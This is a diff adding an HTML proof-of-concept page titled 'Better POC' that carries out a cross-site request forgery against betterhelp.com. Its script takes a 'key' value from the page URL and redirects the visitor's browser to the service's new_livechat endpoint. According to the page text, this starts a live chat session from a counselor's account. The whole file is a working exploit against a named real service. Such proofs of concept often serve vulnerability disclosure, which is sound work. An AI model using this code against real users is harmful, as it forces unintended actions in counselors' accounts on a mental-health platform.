@@ -1,0 +1,18 @@
+<html>
+<head>
+<title> Better POC</title>
+</head>
+<body>
+<center>
+<h1> CSRF POC </h1>
+<p> This will now start a new live chat session from the counselor's account </p>
+</center>
+<script>
+const currentUrl = window.location.href;
+const urlParams = new URLSearchParams(currentUrl);
+const keyValue = urlParams.get("key");
+const newUrl = `https://www.betterhelp.com/new_livechat?key=${keyValue}`;
+window.location.href = newUrl;
+</script>
+</body>
+</html>
